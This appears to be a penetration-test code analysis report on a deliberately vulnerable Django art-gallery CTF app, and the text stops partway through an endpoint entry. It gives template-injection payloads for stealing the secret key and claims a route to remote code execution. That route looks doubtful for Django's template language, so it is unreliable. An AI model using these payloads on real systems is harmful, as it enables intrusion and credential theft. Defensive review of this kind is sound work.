# Penetration Test Code Analysis Report

**Application:** Django Art Gallery (CTF Challenge XBEN-056-24)  
**Framework:** Django 4.2.13  
**Language:** Python 3  
**Assessment Date:** 2025-10-29  
**Analysis Type:** Static Source Code Security Review

---

# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All findings reported meet the "In-Scope" criteria defined below.

### In-Scope: Network-Reachable Components
A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints
- Endpoints requiring authentication via the application's standard login mechanisms
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code

### Out-of-Scope: Locally Executable Only
A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes tools that must be run via:
- A command-line interface (e.g., `python manage.py migrate`)
- Development environment's internal tooling (e.g., IDE run scripts)
- CI/CD pipeline scripts or build tools
- Database migration scripts, backup tools, or maintenance utilities
- Local development servers, test harnesses, or debugging utilities

---

## 1. Executive Summary

The Django Art Gallery application (XBEN-056-24) is a deliberately vulnerable CTF challenge that presents a **CRITICAL** security risk profile with multiple severe vulnerabilities exploitable by external attackers. The application's most critical weakness is a **Server-Side Template Injection (SSTI)** vulnerability in the multi-step registration flow that provides a direct path to Remote Code Execution and flag capture.

The application architecture exhibits fundamental security failures including: **DEBUG mode enabled in production**, **wildcard ALLOWED_HOSTS configuration**, **plaintext password storage in sessions**, and the **CTF flag being used as Django's SECRET_KEY**. These misconfigurations create a cascading security failure where the SSTI vulnerability can be exploited to extract the SECRET_KEY (which contains the flag), forge session cookies, and potentially achieve complete server compromise.

From an external attacker perspective with no internal network access, the primary attack vector is the publicly accessible registration endpoint `/accounts/register/step3/`. The application uses a multi-step registration process where user-controlled input (name field) is stored in Django sessions and subsequently injected into a template without proper sanitization. While a basic input filter blocks the "%" character, this protection is insufficient against Django Template Language injection payloads using `{{ }}` syntax. The vulnerability enables attackers to access the Django settings module, extract sensitive configuration including the SECRET_KEY, and potentially achieve RCE through template engine features.

**Key Attack Surface Highlights:**
- **9 HTTP endpoints** exposed on port 80 (no HTTPS/TLS encryption)
- **1 critical SSTI vulnerability** at `/accounts/register/step3/` providing direct RCE path
- **Zero SSRF attack surface** - application makes no external HTTP requests
- **Zero file upload functionality** - limited attack surface for file-based exploits
- **No REST API or GraphQL endpoints** - traditional web application only
- **MySQL database** on internal Docker network (not directly accessible externally)

---

## 2. Architecture & Technology Stack

### Framework & Language

The application is built using **Django 4.2.13 LTS**, a mature Python web framework with extensive built-in security features. Despite Django's security-focused design, the application deliberately violates numerous security best practices to create an exploitable CTF challenge. The application uses Python 3 as the runtime environment, deployed in a containerized architecture using Docker Compose for orchestration.

**Key Technology Components:**
- **Web Framework:** Django 4.2.13 (LTS version with security updates)
- **Programming Language:** Python 3
- **Template Engine:** Django Template Language (DTL) with auto-escaping enabled by default
- **Frontend Framework:** Bootstrap 4 (bootstrap4==24.3) with jQuery 3.5.1 slim
- **Database ORM:** Django's built-in ORM with parameterized query support
- **WSGI/ASGI Server:** Django development server (NOT production-ready)
- **Python Package Manager:** pip with requirements.txt dependency management

**Security Implications:** While Django provides robust security features including CSRF protection, SQL injection prevention through ORM parameterization, and XSS protection via auto-escaping, these protections are undermined by critical architectural decisions. The use of Django's development server in production (via `python3 manage.py runserver 0.0.0.0:80`) creates performance and security risks as this server is explicitly documented as unsuitable for production use. The absence of a production-grade WSGI server (Gunicorn, uWSGI) and reverse proxy (Nginx, Apache) removes critical security layers including rate limiting, request filtering, and TLS termination.

### Architectural Pattern

**Deployment Architecture:** The application follows a **containerized microservices pattern** using Docker Compose to orchestrate two primary services: the Django web application container and a MySQL 8.4 database container. This separation provides basic isolation between application and data layers, though both containers communicate over an internal Docker network without encryption.

**Application Architecture:** Django's Model-Template-View (MTV) architecture is implemented as a **monolithic web application** serving both frontend HTML templates and backend business logic from a single codebase. The application follows Django's project structure with a root `art_gallery` project containing configuration and a single `accounts` app handling all user-facing functionality.

**Directory Structure:**
```
art_gallery/               # Django project root
├── art_gallery/          # Project configuration package
│   ├── settings.py       # CRITICAL: Contains SECRET_KEY, DEBUG, ALLOWED_HOSTS
│   ├── urls.py           # Root URL routing
│   ├── wsgi.py           # WSGI application entry point
│   └── asgi.py           # ASGI entry point (not used)
└── accounts/             # User management Django app
    ├── views.py          # CRITICAL: Contains SSTI vulnerability
    ├── models.py         # Custom Account user model
    ├── forms.py          # Input validation logic
    ├── urls.py           # App-level URL routing
    └── templates/        # HTML templates (DTL)
        └── accounts/
            ├── register_step3.html  # VULNERABLE: SSTI target
            ├── gallery.html
            ├── login.html
            └── preferences.html
```

**Trust Boundary Analysis:** The application defines clear trust boundaries between external users, authenticated users, and the database layer. However, critical trust boundary violations exist:

1. **External → Application Boundary:** Port 80 HTTP-only exposure transmits all data unencrypted, including authentication credentials. The wildcard `ALLOWED_HOSTS = ['*']` configuration allows Host header injection attacks.

2. **User Input → Template Engine Boundary:** The most critical trust boundary violation occurs at `/accounts/register/step3/` where user-controlled session data crosses into the Django template engine without sanitization. This creates the SSTI vulnerability.

3. **Application → Database Boundary:** Communication occurs over internal Docker network without TLS encryption. The application uses MySQL root account credentials hardcoded in settings.py, violating least-privilege principles.

4. **Session → Application State Boundary:** Django sessions store sensitive data including plaintext passwords during the registration flow, creating a persistent security vulnerability even after account creation.

### Critical Security Components

**Authentication System:** Django's built-in authentication framework with custom user model extending `AbstractUser`. The custom `Account` model adds two fields: `is_premium` (Boolean) and `name` (unique CharField). Password hashing uses Django's default PBKDF2-SHA256 algorithm with appropriate iteration counts for security. However, the multi-step registration process stores plaintext passwords in sessions before hashing, undermining this security.

**Session Management:** Database-backed Django sessions with cookie-based session identifiers. While Django's session framework is generally secure, the application's session security is compromised by:
- **Missing `SESSION_COOKIE_SECURE` flag:** Sessions transmitted over HTTP (not HTTPS)
- **Plaintext sensitive data storage:** Passwords stored in session during registration
- **Session data never cleared:** Sensitive data persists beyond necessity
- **Default 2-week cookie lifetime:** Extended exposure window

**CSRF Protection:** Django's `CsrfViewMiddleware` is enabled and all forms include CSRF tokens. This protection is effective and properly implemented throughout the application.

**XSS Protection:** Django's auto-escaping is enabled by default, providing baseline XSS protection for template variables. However, the SSTI vulnerability completely bypasses this protection by executing template code before escaping can occur.

**SQL Injection Protection:** All database queries use Django ORM with parameterized queries. No raw SQL queries or cursor usage detected. This provides strong SQL injection protection.

**Clickjacking Protection:** Django's `XFrameOptionsMiddleware` is enabled with default `X-Frame-Options: DENY` header, preventing the application from being embedded in iframes.

**Missing Security Components:**
- No Content Security Policy (CSP) headers
- No HTTP Strict Transport Security (HSTS) configuration
- No rate limiting on authentication endpoints
- No security logging or monitoring
- No Web Application Firewall (WAF)
- No intrusion detection/prevention

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms

**Primary Authentication Method:** Django's session-based authentication using database-backed cookies. The authentication flow follows standard Django patterns with custom user model support.

**Custom User Model Implementation:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/models.py`  
**Lines:** 4-9

```python
class Account(AbstractUser):
    is_premium = models.BooleanField(default=False)
    name = models.CharField(unique=True, max_length=40)
```

The custom `Account` model extends Django's `AbstractUser`, inheriting all standard user fields (username, password, email, is_staff, is_active, is_superuser, date_joined) and adding two custom fields. The `name` field has a unique constraint, which creates a username enumeration vulnerability as duplicate name registration attempts will produce distinct error messages. The `is_premium` field exists but has no authorization enforcement in the codebase, representing incomplete feature implementation.

**Password Hashing and Storage:** Django's default password hashing algorithm (PBKDF2-SHA256 with 600,000 iterations) is used, providing strong cryptographic protection for stored passwords. Password validation rules are configured:

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`  
**Lines:** 76-89

- UserAttributeSimilarityValidator: Prevents passwords similar to user attributes
- MinimumLengthValidator: Enforces minimum length (not explicitly configured, defaults to 8 characters)
- CommonPasswordValidator: Blocks common passwords from built-in list
- NumericPasswordValidator: Prevents fully numeric passwords

However, the form-level validation only requires **minimum 10 characters** with no complexity requirements, allowing weak passwords like "aaaaaaaaaa" to pass validation.

### Complete Authentication Endpoint Catalog

#### Registration Flow - Multi-Step Process

**Endpoint 1: Registration Step 1 (Name & Password)**  
**Route:** `/accounts/register/step1/`  
**HTTP Methods:** GET, POST  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Lines:** 10-20  
**Authentication Required:** No (public endpoint)  
**Function:** `register_step1(request)`

Input parameters:
- `name` (CharField, max_length=100, custom validator blocks "%" character)
- `password` (CharField, min_length=10, no complexity requirements)

**CRITICAL SECURITY ISSUE:** Line 15 stores plaintext password in session:
```python
request.session['password'] = form.cleaned_data['password']
```

This violates fundamental security principles by storing sensitive credentials in plaintext in the session backend (MySQL database in `django_session` table). If an attacker gains access to the database, session store, or can exploit session-related vulnerabilities, they can extract plaintext passwords.

**Endpoint 2: Registration Step 2 (Email)**  
**Route:** `/accounts/register/step2/`  
**HTTP Methods:** GET, POST  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Lines:** 22-33  
**Authentication Required:** No (session guard: redirects if 'name' not in session)  
**Function:** `register_step2(request)`

Input parameters:
- `email` (EmailField with Django's built-in email validation)

The email is used as both the username and email fields in the Account model. Session guard at lines 23-24 validates presence of 'name' key but does not verify session integrity or origin.

**Endpoint 3: Registration Step 3 (Premium Selection & Account Creation)**  
**Route:** `/accounts/register/step3/`  
**HTTP Methods:** GET, POST  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Lines:** 35-58  
**Authentication Required:** No (session guard: redirects if 'name' or 'email' not in session)  
**Function:** `register_step3(request)`

**CRITICAL VULNERABILITY - Server-Side Template Injection (SSTI):**  
**Lines:** 53-55

```python
engine = engines["django"]
template_str = open('accounts/templates/accounts/register_step3.html','r').read()
template = engine.from_string(template_str.replace('ACCOUNTNAME', request.session['name']))
```

This code performs a string replacement operation injecting `request.session['name']` into the template file contents, then compiles the result as a Django template. The targeted template line contains:

```html
<script>alert("Hello ACCOUNTNAME. Just Now up to 50% OFF ")</script>
```

**Exploitation Path:**
1. Attacker registers with name: `{{ settings.SECRET_KEY }}` or `{{"".__class__.__mro__[1].__subclasses__()}}` for RCE
2. The `validate_name` function only blocks "%" character (insufficient protection)
3. Name stored in session passes through to step 3
4. String replacement creates: `<script>alert("Hello {{ settings.SECRET_KEY }}...")</script>`
5. Django template engine evaluates the expression, extracting the SECRET_KEY (which contains the flag)
6. Or with RCE payload, attacker can execute arbitrary Python code

**Account Creation Logic (Lines 43-48):**
```python
a=Account(name=request.session['name'],
        username=request.session['email'],
        email=request.session['email'],
        is_premium=is_premium)
a.set_password(request.session['password'])  # Retrieves plaintext password from session
a.save()
```

**Critical Issue:** No session cleanup occurs after account creation. The plaintext password remains in the session store for the default 2-week session lifetime.

#### Login Endpoint

**Route:** `/accounts/login/`  
**HTTP Methods:** GET, POST  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Lines:** 61-73  
**Authentication Required:** No (this is the authentication endpoint)  
**Function:** `login_view(request)`

Input parameters:
- `username` (email address used as username)
- `password`

Authentication implementation (Lines 67-69):
```python
user = authenticate(username=username, password=password)
if user is not None:
    login(request, user)
```

Django's `authenticate()` function hashes the submitted password using the configured algorithm and compares it to the database-stored hash. Upon successful authentication, Django's `login()` function creates an authenticated session. Success redirects to `/accounts/home/` which subsequently redirects to `/` (gallery page).

**Security Analysis:** Standard Django authentication implementation with proper password hashing. However, no rate limiting exists, allowing unlimited brute-force attempts. No account lockout mechanism prevents credential stuffing attacks. No logging captures failed authentication attempts.

#### Logout Endpoint

**Route:** `/accounts/logout/`  
**HTTP Methods:** GET, POST  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Lines:** 97-99  
**Authentication Required:** No explicit requirement (should require authentication)  
**Function:** `logout_view(request)`

Implementation:
```python
logout(request)
return redirect('gallery')
```

Django's `logout()` function flushes the session and invalidates the session cookie. No authentication decorator protects this endpoint, though calling logout without an active session has no adverse effect.

### Session Management and Cookie Security

**Session Backend:** Django's default database-backed session storage. Session data is serialized, signed with SECRET_KEY, and stored in the `django_session` MySQL table.

**Session Cookie Configuration Analysis:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`

**CRITICAL FINDING:** No explicit session cookie security settings configured. Django defaults apply:

| Setting | Value | Location | Security Impact |
|---------|-------|----------|-----------------|
| `SESSION_COOKIE_SECURE` | False (default) | Not configured | **CRITICAL:** Session cookies transmitted over HTTP can be intercepted |
| `SESSION_COOKIE_HTTPONLY` | True (default) | Not configured | **GOOD:** JavaScript cannot access session cookies |
| `SESSION_COOKIE_SAMESITE` | 'Lax' (default) | Not configured | **PARTIAL:** Some CSRF protection, 'Strict' would be better |
| `SESSION_COOKIE_AGE` | 1209600 (default) | Not configured | **ISSUE:** 2-week session lifetime extends exposure |
| `SESSION_EXPIRE_AT_BROWSER_CLOSE` | False (default) | Not configured | Sessions persist beyond browser session |

**Session Cookie Flags - Where They Should Be Configured:**

The application **MUST** add these settings to `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`:

```python
SESSION_COOKIE_SECURE = True          # Require HTTPS for session cookie
SESSION_COOKIE_HTTPONLY = True        # Prevent JavaScript access (already default)
SESSION_COOKIE_SAMESITE = 'Strict'    # Strict CSRF protection
SESSION_EXPIRE_AT_BROWSER_CLOSE = True  # Clear sessions on browser close
SESSION_COOKIE_AGE = 3600             # 1-hour session timeout
```

**Current Configuration Impact:** Since the application runs on HTTP-only (port 80) with no HTTPS/TLS, setting `SESSION_COOKIE_SECURE = True` would break the application. The fundamental issue is the lack of TLS encryption, which must be addressed first.

**Login Redirect Configuration:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`  
**Lines:** 109-111

```python
LOGIN_URL = '/accounts/login/'           # Redirect destination for @login_required
LOGIN_REDIRECT_URL = '/accounts/home/'   # Post-login redirect
LOGOUT_REDIRECT_URL = '/accounts/login/' # Post-logout redirect
```

### Authorization Model and Privilege Escalation

**Authorization Implementation:** Decorator-based access control with minimal implementation. Only **ONE endpoint** in the entire application requires authentication.

**Protected Endpoint:**  
**Route:** `/accounts/preferences/`  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Line:** 78

```python
@login_required
def preferences_view(request):
    return render(request, 'accounts/preferences.html')
```

The `@login_required` decorator checks if `request.user.is_authenticated` is True. If not authenticated, redirects to `LOGIN_URL` (/accounts/login/). This is the ONLY server-side authorization check in the entire application.

**Template-Level Authorization Checks:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/gallery.html`  
**Lines:** 17, 43

```django
{% if not user.is_authenticated %}
    <!-- Show login/register links -->
{% endif %}

{% if user.is_authenticated %}
    <h3 class="my-4 text-center">Welcome, {{ user.name }}!</h2>
{% endif %}
```

**CRITICAL AUTHORIZATION GAPS:**

1. **Gallery View Has No Authorization:** The main gallery view at `/` performs template-level authentication checks but the view function itself has no `@login_required` decorator. While the template conditionally displays content based on authentication status, the view executes for all users.

2. **Home View Unprotected:** `/accounts/home/` redirects to gallery without authentication requirement despite being in the authenticated endpoint namespace.

3. **is_premium Field Not Enforced:** The `is_premium` Boolean field exists on the Account model but has ZERO authorization enforcement anywhere in the codebase. The preferences template displays premium status:

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/preferences.html`  
**Lines:** 39-42

```html
<p>Premium Subscriber:
{% if user.is_premium %}
    <strong style="color: green;">Yes (Pending features exclusive to subscribers)</strong>
{% else %}
    <strong style="color: red;">No</strong>
{% endif %}
</p>
```

The text "Pending features exclusive to subscribers" indicates incomplete feature implementation. No premium-only functionality exists in the application, making this field purely cosmetic.

4. **No Role-Based Access Control (RBAC):** The application does not implement Django's permissions framework (`django.contrib.auth.permissions`), Groups, or any custom permission models.

5. **No Admin Interface Protection:** While `django.contrib.admin` is in `INSTALLED_APPS`, no admin URL is registered in `urls.py`. If the admin were exposed, default credentials or weak authentication could provide privileged access.

**Privilege Escalation Opportunities:**

- **Session Manipulation:** If an attacker can manipulate session data (via SSTI or direct database access), they could potentially modify user authentication state
- **is_premium Field Manipulation:** Direct database access or SSTI exploitation could set `is_premium=True` for any account, though this currently grants no additional privileges
- **Missing Authorization Checks:** New premium features added without proper authorization checks would be accessible to all users

### SSO/OAuth/OIDC Flows

**Finding:** No Single Sign-On, OAuth, or OpenID Connect implementations detected.

**Analysis:**
- No OAuth libraries present in `requirements.txt` (no `django-allauth`, `python-social-auth`, `authlib`)
- No OAuth callback endpoints in URL configuration
- No state parameter validation code
- No nonce validation for OIDC
- No JWKS (JSON Web Key Set) fetching
- No external identity provider configuration

The application relies solely on Django's built-in username/password authentication with no federated identity support.

### Multi-Tenancy Security

**Finding:** No multi-tenancy implementation detected.

**Analysis:**
- Single database configuration with no tenant isolation
- No schema separation mechanisms
- No row-level security filtering
- No tenant-scoped queries in ORM
- The `is_premium` field suggests potential multi-tier access tiers but is not implemented as multi-tenancy

---

## 4. Data Security & Storage

### Database Security

**Database Engine:** MySQL 8.4 running in isolated Docker container  
**Database Name:** `art_db`  
**Connection Configuration:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`  
**Lines:** 65-74

```python
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME':'art_db',
        'HOST': 'db',
        'USER':'root',
        'PASSWORD':'art_gallery',
        'PORT':'3306'
    }
}
```

**CRITICAL DATABASE SECURITY ISSUES:**

1. **Root User Access (Line 70):** The application connects to MySQL using the `root` user account, violating the principle of least privilege. If the application is compromised, the attacker gains full database administrative privileges including the ability to:
   - Drop all databases
   - Create new administrative users
   - Modify user permissions
   - Execute arbitrary SQL on all databases
   - Access system tables and configurations

2. **Hardcoded Credentials (Line 71):** Database password `'art_gallery'` is hardcoded in source code, which means:
   - Credentials committed to version control (git history exposes them permanently)
   - No credential rotation mechanism
   - Same password across all environments (dev, staging, production)
   - Source code disclosure reveals database access

3. **No TLS/SSL Connection:** The MySQL connection configuration lacks SSL/TLS settings. Communication between Django container and MySQL container occurs over internal Docker network without encryption. While internal Docker networks provide network-level isolation, any container compromise or network sniffing within the Docker bridge could intercept database traffic including queries and credentials.

4. **No Connection Pooling Configuration:** Default Django database settings apply, which may lead to connection exhaustion under load.

**Additional Database Credential Exposures:**

**Location 1 - MySQL Dockerfile:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/mysql/Dockerfile`  
**Lines:** 3-4

```dockerfile
ENV MYSQL_ROOT_PASSWORD=art_gallery
ENV MYSQL_DATABASE=art_db
```

**Location 2 - Docker Compose Healthcheck:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/docker-compose.yml`  
**Line:** 7

```yaml
healthcheck:
  test: ["CMD", "mysqladmin", "ping", "-h", "localhost", "--password=art_gallery", "-u", "root"]
```

The database password appears in the healthcheck command, visible via `docker inspect` command, container logs, and process listings.

**Query Safety - SQL Injection Analysis:**

**Status:** No SQL injection vulnerabilities detected. The application exclusively uses Django ORM with parameterized queries.

**Evidence:**
- No `.raw()` method calls on querysets
- No `.execute()` calls on database cursors
- No direct cursor usage via `connection.cursor()`
- All database operations use Django ORM methods (`.save()`, `.create()`, `.filter()`, `.get()`)

**Example Safe Query:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Lines:** 43-48

```python
a=Account(name=request.session['name'],
        username=request.session['email'],
        email=request.session['email'],
        is_premium=is_premium)
a.set_password(request.session['password'])
a.save()
```

This creates a parameterized INSERT statement where user input is properly escaped by the ORM. Django's ORM provides robust SQL injection protection by using prepared statements with bound parameters.

**Database Access Control Recommendations:**
1. Create application-specific MySQL user with minimal privileges
2. Grant only SELECT, INSERT, UPDATE, DELETE on `art_db` database
3. Revoke DROP, CREATE, ALTER privileges
4. Store credentials in environment variables
5. Enable MySQL TLS/SSL for container-to-container communication
6. Implement connection pooling for production deployment

### Data Flow Security

**Sensitive Data Inventory:**

| Data Type | Storage Location | Protection Status | Risk Level |
|-----------|-----------------|-------------------|------------|
| User Passwords | Django Session (during registration) | **PLAINTEXT** | **CRITICAL** |
| User Passwords | MySQL `accounts_account.password` | PBKDF2-SHA256 hash | LOW (properly hashed) |
| Email Addresses | Django Session, MySQL database | Plaintext | HIGH (PII) |
| User Names | Django Session, MySQL database | Plaintext | MEDIUM (PII) |
| Premium Status | MySQL database | Plaintext boolean | LOW |
| Session IDs | HTTP Cookies | Signed (SECRET_KEY) | HIGH (if SECRET_KEY leaked) |
| CSRF Tokens | HTTP Cookies, HTML forms | Signed (SECRET_KEY) | MEDIUM |

**CRITICAL Data Flow Vulnerability - Plaintext Password in Session:**

**Vulnerability Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py:15`

**Data Flow Trace:**

```
1. User Browser (HTTPS/HTTP form submission)
   ↓ POST /accounts/register/step1/
   └─ {name: "John", password: "MySecretPassword123"}

2. Django View: register_step1 (Line 15)
   ↓ request.session['password'] = form.cleaned_data['password']
   └─ Password stored as PLAINTEXT string in session dictionary

3. Django Session Middleware
   ↓ Serializes session data
   └─ {name: "John", password: "MySecretPassword123", ...}

4. Session Backend (MySQL Database)
   ↓ INSERT into django_session table
   └─ session_data: base64(signed(json({password: "MySecretPassword123"})))

5. Session Persists for 14 days (default SESSION_COOKIE_AGE)
   ↓ Password remains in database even after account creation
   └─ NO cleanup performed after registration step 3

6. Potential Exposure Vectors:
   ├─ Database breach → Plaintext passwords in django_session table
   ├─ Session hijacking → Attacker reads request.session['password']
   ├─ SSTI exploitation → Template access to session data
   ├─ Server backup files → Backups contain plaintext passwords
   └─ Memory dumps → Session data cached in application memory
```

**Impact Assessment:** This vulnerability has catastrophic security implications:
- **Credential Exposure:** User passwords stored in plaintext for extended periods
- **Cascading Compromise:** Users who reuse passwords across services are at risk
- **Regulatory Violations:** GDPR, HIPAA, PCI-DSS violations for plaintext password storage
- **Attack Amplification:** SSTI vulnerability can extract session data containing passwords

**Secure Alternative Implementation:**
```python
# DO NOT store password in session
# Instead, hash immediately or use single-page registration
def register_step1(request):
    if request.method == 'POST':
        form = Step1Form(request.POST)
        if form.is_valid():
            request.session['name'] = form.cleaned_data['name']
            # SECURE: Hash password immediately, never store plaintext
            request.session['password_hash'] = make_password(form.cleaned_data['password'])
            return redirect('register_step2')
```

Or better yet, use single-page registration to avoid session storage entirely.

**Session Data Never Cleared:**

After account creation completes at step 3 (Line 48: `a.save()`), the code does **NOT** clear sensitive session data. Proper implementation requires:

```python
# After line 48 in views.py
a.save()
# Clear sensitive session data
request.session.pop('password', None)
request.session.pop('name', None)
request.session.pop('email', None)
# Or flush entire session
request.session.flush()
```

### Data Encryption

**Encryption at Rest:** **MINIMAL - Passwords Only**

The application provides NO encryption at rest for user data except password hashing:

| Data Type | Encryption Status | Implementation |
|-----------|-------------------|----------------|
| Passwords | ✓ Hashed | Django PBKDF2-SHA256 (600,000 iterations) |
| Emails | ✗ Plaintext | No encryption |
| Names | ✗ Plaintext | No encryption |
| Premium Status | ✗ Plaintext | No encryption |
| Session Data | ✗ Plaintext (signed only) | Base64 + HMAC signature, not encrypted |

**Password Hashing Implementation:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py:47`

```python
a.set_password(request.session['password'])
```

Django's `set_password()` method uses the configured password hashers. Default configuration:

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`  
**Lines:** 76-89

```python
AUTH_PASSWORD_VALIDATORS = [
    {'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator'},
    {'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator'},
    {'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator'},
    {'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator'},
]
```

Django 4.2.13 defaults to PBKDF2-SHA256 with 600,000 iterations, producing password hashes in the format:
```
pbkdf2_sha256$600000$<salt>$<hash>
```

This is cryptographically secure for password storage. However, it does NOT protect against the plaintext password exposure in sessions.

**Encryption in Transit:** **NOT IMPLEMENTED**

**CRITICAL FINDING:** The application has ZERO TLS/SSL encryption. All data transmission occurs over unencrypted HTTP.

**Evidence:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/Dockerfile`  
**Line:** 25

```dockerfile
CMD ["sh", "-c", "./wait-for-it.sh db:3306 -- python3 manage.py migrate && python3 manage.py runserver 0.0.0.0:80"]
```

The Django development server runs on port 80 (HTTP) with no HTTPS configuration.

**Missing TLS Configuration in Settings:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`

These critical security settings are **NOT CONFIGURED**:
```python
SECURE_SSL_REDIRECT = False          # Not set - should redirect HTTP to HTTPS
SECURE_PROXY_SSL_HEADER = None       # Not set - should detect HTTPS from proxy
SESSION_COOKIE_SECURE = False        # Not set - cookies sent over HTTP
CSRF_COOKIE_SECURE = False          # Not set - CSRF tokens sent over HTTP
SECURE_HSTS_SECONDS = 0             # Not set - no HSTS policy
SECURE_HSTS_INCLUDE_SUBDOMAINS = False  # Not set
SECURE_HSTS_PRELOAD = False         # Not set
```

**Impact of No TLS:**
- **Password Interception:** Login credentials transmitted in plaintext over network
- **Session Hijacking:** Session cookies can be captured via packet sniffing
- **CSRF Token Exposure:** CSRF tokens visible to network observers
- **Man-in-the-Middle Attacks:** All traffic susceptible to MITM attacks
- **Compliance Violations:** GDPR, PCI-DSS, HIPAA require encryption in transit for sensitive data

### Multi-Tenant Data Isolation

**Finding:** No multi-tenancy implementation exists in the application.

**Analysis:**
- Single database schema for all users
- No tenant ID fields in models
- No row-level security filters
- No schema separation or database-per-tenant architecture
- All users share the same `accounts_account` table

The `is_premium` field suggests potential for tiered access levels but does not implement multi-tenancy as traditionally defined (separate data isolation between organizational tenants).

---

## 5. Attack Surface Analysis

### External Entry Points

The application exposes **9 HTTP endpoints** on port 80 (HTTP-only, no HTTPS/TLS). All endpoints are network-accessible from external attackers with no VPN or internal network access required.

#### **Endpoint 1: Gallery View (Homepage)**

**Route:** `/`  
**HTTP Method:** GET (accepts POST but only processes GET)  
**Authentication Required:** No (public access)  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Lines:** 82-95  
**Function:** `gallery_view(request)`

**Functionality:** Displays static gallery of 9 art items with hardcoded data (images, names, descriptions, prices). No dynamic content, no database queries, no user input processing.

**Input Parameters:** None accepted

**Attack Surface Assessment:**
- **XSS Risk:** LOW (no user input displayed)
- **SQL Injection Risk:** NONE (no database queries)
- **IDOR Risk:** NONE (no resource access by ID)
- **Information Disclosure:** LOW (static content only)

**Security Controls:**
- CSRF protection enabled (though not needed for GET)
- Template auto-escaping active
- No sensitive data exposure

**Template File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/gallery.html`

#### **Endpoint 2: Registration Step 1**

**Route:** `/accounts/register/step1/`  
**HTTP Method:** GET, POST  
**Authentication Required:** No  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Lines:** 10-20

**Input Parameters:**
- `name`: CharField (max 100 characters, custom validator blocks "%" symbol)
- `password`: CharField (minimum 10 characters, no max length, no complexity requirements)

**Attack Surface Assessment:**
- **Input Validation Weakness:** Only blocks "%" character, allowing most special characters and potential XSS/SSTI payloads
- **Plaintext Password Storage:** Stores password in session (CRITICAL vulnerability)
- **Username Enumeration:** Unique constraint on name field allows enumeration via registration attempts
- **No Rate Limiting:** Unlimited registration attempts possible
- **No CAPTCHA:** Automated registration abuse possible

**Validation Logic:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/forms.py`  
**Lines:** 6-12

```python
def validate_name(value):
    if "%" in value:
        raise ValidationError('The name cannot contain the "%" symbol.')

class Step1Form(forms.Form):
    name = forms.CharField(label='Name', max_length=100, validators=[validate_name])
    password = forms.CharField(label='Password', min_length=10, widget=forms.PasswordInput())
```

**Security Bypass:** The "%" validator is insufficient to prevent SSTI attacks. Django Template Language uses `{{ }}` and `{% %}` syntax, and only the "%" character is blocked. Attack payloads like `{{ settings.SECRET_KEY }}` pass validation.

#### **Endpoint 3: Registration Step 2**

**Route:** `/accounts/register/step2/`  
**HTTP Method:** GET, POST  
**Authentication Required:** No (session guard requires 'name' in session)  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Lines:** 22-33

**Input Parameters:**
- `email`: EmailField (Django's built-in email validation regex)

**Attack Surface Assessment:**
